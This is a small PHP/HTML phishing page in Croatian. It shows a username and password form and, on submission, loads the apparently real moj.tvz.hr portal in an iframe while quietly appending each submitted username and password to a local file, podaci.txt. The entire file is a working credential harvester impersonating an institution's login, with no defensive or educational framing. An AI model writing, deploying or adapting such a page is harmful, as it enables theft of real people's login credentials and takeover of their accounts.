<!DOCTYPE html>
<html>
<head>
	<style>
		iframe {
			width:100%;height:900px; border:0;overflow: hidden;
			 
		}
	</style>
<body>

<?php
if(empty($_POST)){
print '
<form action="tvz.php" method="POST">
	Korisničko ime: <input type="text" name="username"><br>
	Lozinka: <input type="password" name="pass"><br>
	<input type="submit" value="Submit">
</form>';
}
else {
	print '<iframe src="https://moj.tvz.hr"></iframe>';
	if(isset($_POST['username']) && isset($_POST['pass'])) {
		$data = $_POST['username'] . '-' . $_POST['pass'] . "\n";
		$ret = file_put_contents('podaci.txt', $data, FILE_APPEND | LOCK_EX);
		
	}
}
?>

</body>
</html>
